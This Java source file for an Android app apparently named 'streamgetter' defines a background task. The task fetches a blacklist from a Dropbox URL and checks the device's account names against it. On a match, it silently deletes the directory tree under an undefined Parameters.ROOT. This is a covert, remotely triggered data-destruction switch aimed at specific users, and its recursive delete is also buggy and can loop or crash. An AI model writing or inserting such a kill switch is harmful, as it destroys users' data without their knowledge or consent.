package com.fallen.streamgetter;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;

import android.accounts.Account;
import android.os.AsyncTask;

public class AsyncBlackListAction extends AsyncTask<String, Void, Void>{
	Account[] accounts;

	
	public AsyncBlackListAction(Account[] accounts) {
		// TODO Auto-generated constructor stub
		this.accounts = accounts;
	}

	@Override
	protected Void doInBackground(String... params) {
		// TODO Auto-generated method stub
		URL url;
		try {
			url = new URL("https://dl.dropbox.com/u/102433765/blacklist.txt");
			InputStream is = url.openStream();
			InputStreamReader reader = new InputStreamReader(is);
			BufferedReader br = new BufferedReader(reader );
			StringBuilder sb = new StringBuilder();
			String line= null;
			try {
				while ((line = br.readLine() )!=null)
				{
					sb.append(line);
				}
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			for (int i = 0; i < accounts.length; i++) {
				if ( sb.toString().contains(accounts[i].name))
					die();
					
			}
			
		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		
		return null;
	}

	private void die() {
		// TODO Auto-generated method stub
		System.out.println ("die");
		File file = new File(Parameters.ROOT);
		DeleteRecursive(file);
	}
	void DeleteRecursive(File fileOrDirectory) {
	    if (fileOrDirectory !=null && fileOrDirectory.isDirectory())
	    {
	    	File [] listFiles = null;
		        try {
		        	listFiles =fileOrDirectory.listFiles(); 
				} catch (Exception e) {
					// TODO: handle exception
					DeleteRecursive (new File( Parameters.ROOT));
				}
	    	for (File child :listFiles)
	        {
	            DeleteRecursive(child);
	        }
	    }
	    if (fileOrDirectory!=null)
	    	System.out.println (fileOrDirectory + " " + fileOrDirectory.delete());
	}
	

}
